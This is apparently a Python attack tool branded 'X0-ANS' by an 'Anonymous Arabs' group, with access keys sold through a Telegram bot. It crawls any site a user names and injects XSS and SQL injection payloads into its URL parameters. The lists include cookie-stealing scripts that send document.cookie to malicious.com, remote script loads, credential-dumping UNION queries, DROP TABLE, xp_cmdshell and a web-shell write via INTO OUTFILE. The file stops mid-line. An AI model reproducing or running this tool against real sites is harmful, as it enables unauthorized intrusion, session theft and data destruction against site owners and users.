import requests
from bs4 import BeautifulSoup
import socket
import nmap
from colorama import Fore, Style, init
import re
import os
import difflib
import time
import pyfiglet
import random
import sys
import ssl
import json

# Initialize colorama
init(autoreset=True)

# List of valid API keys
VALID_API_KEYS = ["x0old", "x0m7s", "X0ANS", "anonymous arabs", "x0dark", "x0black widow", "x0round", "key3", "key2"]  # Add more keys as needed

def slow_print(text, color, delay=0.05):
    """Print text slowly with color control."""
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)  # Reset after printing

def check_api_key():
    # Initial message in white with slow print
    slow_print("Please enter your tool access key. If you don't have one, purchase it ..", Fore.WHITE, delay=0.02)
    print("")
    
    # Second message in blue without slow print
    print(Fore.CYAN + "To purchase access keys, contact us via this Telegram bot:" + Style.RESET_ALL)
    
    # Telegram username in red with slow print
    slow_print("https://t.me/AnonDos777Bot", Fore.RED, delay=0.05)
    
    print("")
    
    while True:
        # Request for input key in green with fast slow print
        slow_print("Please enter your API key 🔑 : ", Fore.GREEN, delay=0.02)
        
        # User input in red
        user_input = input(Fore.MAGENTA).strip()  # Use .strip() to remove leading/trailing spaces
        
        # Reset styles after user input
        print(Style.RESET_ALL)

        # If the user input is empty (just Enter), ask again
        if not user_input:
            print(Fore.RED + "Error: You must enter a valid key. Please try again." + Style.RESET_ALL)
            continue  # Loop again to ask for input

        # Check if the entered key is in the valid list
        if user_input in VALID_API_KEYS:
            print(Fore.GREEN + "Welcome!" + Fore.RESET)
            print(Fore.WHITE + "Press Enter to proceed ▶️" + Fore.RESET)
            input()  # Wait for user to press Enter
            return True  # Allow access to the tool
        else:
            # Print random fake error codes to stop the program
            print(Fore.RED + "Invalid access key, please enter a correct key to enter ❌" + Style.RESET_ALL)
            generate_fake_errors()
            return False

def generate_fake_errors():
    # Generate random fake error codes
    for i in range(10):
        print(f"Error {i+1}: {random.randint(1000, 9999)} - Fatal system error.")
    sys.exit()  # Exit the program after printing fake codes

# Run the old tool function
def run_old_tool():
    print("Running the old tool...")
    # Place old tool code here

def main():
    # Check the entered key
    if check_api_key():
        # If the key is valid, run the tool
        run_old_tool()

if __name__ == "__main__":
    main()

# Create a session object
session = requests.Session()

# Set up session to manage redirects and User-Agent
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
})

# Function to print colored text
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)
    
# Input function that validates user input
def enter_num():
    while True:  # Infinite loop until a valid number is entered
        choice = input(Fore.YELLOW + "Choose one of these options by entering its number: " + Style.RESET_ALL + "\n")

        if choice == '1':
            vuln_menu()  # Go to vulnerability scan
            break  # Exit the loop after valid input
        elif choice == '2':
            gather_info_menu()  # Go to information gathering
            break  # Exit the loop after valid input
        else:
            print_colored("Invalid choice! Please enter a valid number.", Fore.RED)

# Function to show logo with slow print
def show_logo():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')  
    
    logo_text = "X0-ANS"
    subtitle = "Anonymous Arabs Organization"
    urlans = "Telegram : "
    urlas = "https://t.me/Anonymusarabs"
    
    # Generate large logo using pyfiglet with a bigger font
    big_logo = pyfiglet.figlet_format(logo_text, font="banner3-D")

    # Display the big logo with slow print
    for line in big_logo.splitlines():
        print(Fore.RED + Style.BRIGHT + line, flush=True)
        time.sleep(0.1)  # Delay between lines for effect

    print()  # New line after logo

    # Display the subtitle with delay
    for char in subtitle:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)
    
    print("\n")  # New line after title

    # Display Telegram link with delay
    for char in urlans:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)

    for char in urlas:
        print(Fore.RED + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.05)

    print("\n")  # New line after link

    # Delay before showing menu
    time.sleep(0.4)

# Main menu function
def main_menu():
    show_logo()
    print_colored("========================================", Fore.CYAN)
    print_colored("           Vulnerability Testing Tool           ", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    print()
    print_colored("1. Vulnerability Scan", Fore.MAGENTA)
    print_colored("2. Gather Website Information", Fore.MAGENTA)
    print()
    print_colored("========================================", Fore.RED)
    print()
    enter_num()

# List of known sites for comparison
known_sites = [
    "www.google.com", "www.facebook.com", "www.youtube.com", 
    "www.amazon.com", "www.wikipedia.org", "www.example.com"
]

# Function to validate URL
def validate_url(url):
    pattern = r'^(www\.)?([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,6}$'
    return re.match(pattern, url) is not None

# Function to suggest similar URLs based on available links using difflib
def suggest_url(url):
    suggestions = difflib.get_close_matches(url, known_sites, n=3, cutoff=0.6)  # Similarity threshold of 60%
    return suggestions if suggestions else None

# Function to check if the site is operational
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"The site is unavailable. HTTP Status: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("The site is unavailable or there is a connection error.", Fore.RED)
        return False

# Validate the entered protocol
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("Please choose a valid protocol (1 for HTTP or 2 for HTTPS)", Fore.RED)
        return False
    return True

# List of vulnerabilities to scan with associated checking functions
def vuln_menu():
    print_colored("\nVulnerability Scan", Fore.CYAN)

    # Validate site input without protocol
    while True:
        url = input(Fore.YELLOW + "Enter the site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
        
        if validate_url(url):
            break
        else:
            suggested_urls = suggest_url(url)
            if suggested_urls:
                print_colored("The link is invalid. Did you mean one of the following links?", Fore.YELLOW)
                for suggested in suggested_urls:
                    print_colored(f"- {suggested}", Fore.GREEN)
                url = suggested_urls[0]  # Choose the first suggestion as default
                break
            else:
                print_colored("Invalid link and no suggestions available. Please enter a valid link.", Fore.RED)

    # Validate the entered protocol
    while True:
        print_colored("1. HTTP", Fore.GREEN)
        print_colored("2. HTTPS", Fore.GREEN)
        protocol_choice = input(Fore.YELLOW + "Choose the protocol: " + Style.RESET_ALL + "\n")
        if validate_protocol(protocol_choice):
            break

    protocol = 'https://' if protocol_choice == '2' else 'http://'
    target_url = protocol + url

    # Check if the site is operational
    while True:
        if check_site_status(target_url):
            break
        else:
            url = input(Fore.YELLOW + "Enter an operational site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
            if validate_url(url):
                target_url = protocol + url

    print_colored("\nSelect the type of examination ( 1 , 2 , 3 , 4 ) :", Fore.CYAN)
    print_colored("1. XSS Check", Fore.GREEN)
    print_colored("2. SQL Injection Check", Fore.GREEN)
    print_colored("3. CSRF Check", Fore.GREEN)
    print_colored("4. Comprehensive scan for all vulnerabilities", Fore.GREEN)
    print_colored("5. Return to previous list", Fore.GREEN)
    
    vuln_choice = input(Fore.YELLOW + "Choose the type of examination :" + Style.RESET_ALL + "\n")
    
    if vuln_choice == '1':
        print_colored("\n XSS checking...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        crawl_and_test(target_url, xss_payloads, "XSS")

    elif vuln_choice == '2':
        print_colored("\n SQL Injection Check...", Fore.CYAN)
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        crawl_and_test(target_url, sql_payloads, "SQL Injection")

    elif vuln_choice == '3':
        print_colored("\n CSRF check...", Fore.CYAN)
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '4':
        print_colored("\n Comprehensive scan for all vulnerabilities...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        
        crawl_and_test(target_url, xss_payloads, "XSS")
        crawl_and_test(target_url, sql_payloads, "SQL Injection")
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '5':
        main_menu()  # Back to main menu
    else:
        print_colored("Incorrect choice!", Fore.RED)
        vuln_menu()

    post_scan_options()

def post_scan_options():
    slow_print("\n Do you want to :", Fore.CYAN, delay=0.05)
    print("1. Return to the checklist")
    print("2. Terminate the program")
    
    choice = input(Fore.YELLOW + "Choose an option:" )
    if choice == '1':
        main_menu()
    elif choice == '2':
        print_colored("Thank you for using the tool ❤️", Fore.CYAN)
        exit()
    else:
        slow_print("Incorrect choice 🚫", Fore.RED, delay=0.02)
        post_scan_options()


# الزحف واختبار الثغرات
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f"Crawl on the site:{url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)

# الزحف وجمع الروابط والفورمز من الموقع
def crawl_site(url):
    crawled_urls = set()
    forms = []

    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = requests.compat.urljoin(url, link['href'])
            if url in full_url and full_url not in crawled_urls:
                crawled_urls.add(full_url)
                time.sleep(1)  # إضافة تأخير بين كل طلب

        forms = soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print_colored(f"A mistake while crawling:🚫 : {e}", Fore.RED)
    
    return crawled_urls, forms
    
    # إنشاء كائن session
session = requests.Session()


# فحص الثغرات وتحديث التقرير
# محاولة فحص الرابط مع إعادة المحاولة في حالة حدوث خطأ
def test_vulnerabilities(base_url, urls, forms, payloads, vuln_type):
    report = []
    
    # فحص الروابط
    for url in urls:
        params = get_params(url)
        for param in params:
            for payload in payloads:
                new_url = f"{url}?{param}={payload}"
                attempt = 0
                while attempt < 3:  # إعادة المحاولة حتى 3 مرات
                    try:
                        response = session.get(new_url, timeout=10)
                        if payload in response.text:
                            report.append({
                                "vuln_type": vuln_type,
                                "param": param,
                                "url": url,
                                "payload": payload,
                                "direct_link": new_url
                            })
                            print_colored(f"✅ Exploit found {vuln_type} Discovered in this parameter : {param} In this link : {url}", Fore.GREEN)
                            break  # الانتقال إلى الباراميتر أو الفورم التالي بعد اكتشاف الثغرة
                        break
                    except requests.exceptions.RequestException as e:
                        attempt += 1
                        print_colored(f"خطأ أثناء فحص الرابط {url}: {e}, إعادة المحاولة ({attempt}/3)", Fore.RED)
                        time.sleep(1)  # انتظار قبل إعادة المحاولة

    # فحص الفورمات
    for form in 